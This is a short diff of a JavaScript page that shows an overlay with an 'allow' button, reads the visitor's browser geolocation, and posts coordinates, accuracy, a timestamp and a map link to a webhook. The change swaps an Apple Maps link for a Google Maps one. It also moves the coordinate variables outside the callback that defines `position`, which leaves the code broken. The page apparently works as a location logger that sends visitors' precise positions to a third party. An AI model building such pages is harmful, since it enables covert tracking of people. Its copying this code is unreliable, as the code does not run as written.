@@ -112,12 +112,13 @@ function getCentralTimeISO() {
   }).format(new Date());
 }
 
+  const lat = position.coords.latitude;
+  const lng = position.coords.longitude;
 
 	
 	 document.addEventListener("DOMContentLoaded", () => {
      console.log("DOM loaded");
-  const lat = position.coords.latitude;
-  const lng = position.coords.longitude;
+
   const overlay = document.getElementById("overlay");
   const content = document.getElementById("content");
   const allowBtn = document.getElementById("allow");
@@ -147,7 +148,7 @@ function getCentralTimeISO() {
             longitude: position.coords.longitude,
             accuracy: position.coords.accuracy,
             timestamp: getCentralTimeISO(),
-			map: `https://maps.apple.com/?ll=${lat},${lng}`
+			map: `https://www.google.com/maps?q=${lat},${lng}`
           })
         }).catch(err => console.error("Webhook error:", err));
       },
